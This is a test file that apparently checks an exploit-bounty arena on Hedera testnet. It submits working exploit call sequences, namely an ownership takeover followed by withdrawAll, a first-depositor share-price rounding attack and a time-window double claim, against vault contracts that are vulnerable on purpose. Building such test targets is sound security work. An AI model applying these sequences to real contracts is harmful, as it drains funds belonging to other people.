import { beforeAll, describe, expect, it } from "bun:test";
import { generatePrivateKey } from "viem/accounts";
import { runSubmit } from "../src/agentRunner.ts";
import { insertAgent, initSchema } from "../src/db.ts";
import { encryptPrivateKey } from "../src/wallet.ts";

// serverConfig is lazy — set env before first call.
process.env.HEDERA_TESTNET_RPC_URL = process.env.HEDERA_TESTNET_RPC_URL ?? "https://testnet.hashio.io/api";
process.env.HEDERA_USDC_TESTNET_ADDRESS = "0x0000000000000000000000000000000000068cda";
process.env.ARENA_ADDRESS =
  process.env.REHEARSAL_ARENA_ADDRESS ?? "0x5928df319b3D062203D6aF33A6797df4a96b18a4";
process.env.HEDERA_ARENA_ACCOUNT_ID = "0.0.1234";
process.env.ACCESS_CONTROL_VAULT_ADDRESS = "0x73524775e7c01E862F8d0E381D1154d7939cC160";
process.env.ROUNDING_VAULT_ADDRESS = "0x9Cb289aa00508D1B1eb8Aa1Eb21F552Eed4dA37A";
process.env.TIME_WINDOW_VAULT_ADDRESS = "0xFf608EC643D5c10204c20dfe1A2a43ebC45CcCEd";
process.env.VERIFIER_KEY = process.env.TESTNET_VERIFIER_KEY ?? "0xnotset";
process.env.SERVER_WALLET_SECRET = process.env.LIVE_WALLET_SECRET ?? "live-secret";
process.env.DATABASE_URL = process.env.DATABASE_URL!;

const runTestnet = process.env.RUN_TESTNET === "1";

let agentId: string;
let agentWallet: string;
let beneficiary: string;

beforeAll(async () => {
  if (!runTestnet) return;
  if (!process.env.TESTNET_VERIFIER_KEY) {
    throw new Error("RUN_TESTNET=1 requires TESTNET_VERIFIER_KEY");
  }
  await initSchema();
  const { privateKeyToAccount } = await import("viem/accounts");
  const key = generatePrivateKey();
  agentWallet = privateKeyToAccount(key).address;
  beneficiary = privateKeyToAccount(process.env.TESTNET_VERIFIER_KEY as `0x${string}`).address;
  agentId = await insertAgent({
    label: `live-smoke-${Date.now()}`,
    walletAddress: agentWallet,
    encryptedPrivateKey: encryptPrivateKey(key, process.env.LIVE_WALLET_SECRET ?? "live-secret"),
    erc8004TokenId: "mock-id:live-smoke",
  });
});

describe("live targets — every exploit must flip its invariant on testnet (RUN_TESTNET=1)", () => {
  it(
    "access-control-vault: setOwner + withdrawAll → VALID (or already claimed from an earlier run)",
    async () => {
      if (!runTestnet) return;
      // The invariant id is permanent on-chain: once paid, a target is claimed
      // forever (settle-once dedup). A second run legitimately hits
      // "already claimed" — both outcomes prove the target works.
      let verdict = "INVALID";
      let settlementTxHash = "";
      try {
        const r = await runSubmit(agentId, "access-control-vault", [
          { caller: agentWallet, entryPoint: "setOwner", args: { newOwner: agentWallet } },
          { caller: agentWallet, entryPoint: "withdrawAll", args: {} },
        ]);
        verdict = r.verdict;
        settlementTxHash = r.settlementTxHash;
      } catch (e) {
        if (String((e as Error).message).includes("already claimed")) {
          console.log("access-control-vault: already claimed (earlier run) — skipping");
          return;
        }
        throw e;
      }
      expect(verdict).toBe("VALID");
      expect(settlementTxHash).toMatch(/^0x/);
    },
    240000
  );

  it(
    "rounding-vault: first-depositor share-price exploit → VALID (or already claimed)",
    async () => {
      if (!runTestnet) return;
      // Single caller (the agent wallet) works: the victim deposit's only role
      // is to bump totalDeposited — the attacker's own second deposit does that.
      let verdict = "INVALID";
      try {
        const r = await runSubmit(agentId, "rounding-vault", [
          { caller: agentWallet, entryPoint: "deposit", args: {} },
          { caller: agentWallet, entryPoint: "donate", args: { amount: 1_000_000 } },
          { caller: agentWallet, entryPoint: "deposit", args: {} }, // 0 shares, +1_000 deposited
          { caller: agentWallet, entryPoint: "transferShares", args: { to: agentWallet, shareCount: 100 } },
          { caller: agentWallet, entryPoint: "transferShares", args: { to: agentWallet, shareCount: 200 } },
          { caller: agentWallet, entryPoint: "withdraw", args: { shareCount: 700 } },
        ]);
        verdict = r.verdict;
      } catch (e) {
        if (String((e as Error).message).includes("already claimed")) {
          console.log("rounding-vault: already claimed (earlier run) — skipping");
          return;
        }
        throw e;
      }
      expect(verdict).toBe("VALID");
    },
    240000
  );

  it(
    "time-window-vault: drain faster than the intended cadence → VALID (or already claimed)",
    async () => {
      if (!runTestnet) return;
      // First claim is fine; after REFILL_BLOCKS (60) fast blocks the refill
      // fires — far less real time than INTENDED_REFILL_SECONDS (720s) requires,
      // so the second claim breaks the timestamp-based invariant.
      // The verifier waits for each tx receipt, so the 60-block gap passes naturally.
      let verdict = "INVALID";
      try {
        const r = await runSubmit(agentId, "time-window-vault", [
          // Only the beneficiary (the deployer/verifier) may claim — the
          // verifier signs calls from its own address. waitBlocks on the
          // FIRST claim lets the 60-block refill cadence elapse before the
          // second claim fires.
          { caller: beneficiary, entryPoint: "claim", args: { amount: 100_000_000 }, waitBlocks: 60 },
          { caller: beneficiary, entryPoint: "claim", args: { amount: 100_000_000 } },
        ]);
        verdict = r.verdict;
      } catch (e) {
        if (String((e as Error).message).includes("already claimed")) {
          console.log("time-window-vault: already claimed (earlier run) — skipping");
          return;
        }
        throw e;
      }
      expect(verdict).toBe("VALID");
    },
    300000
  );
});
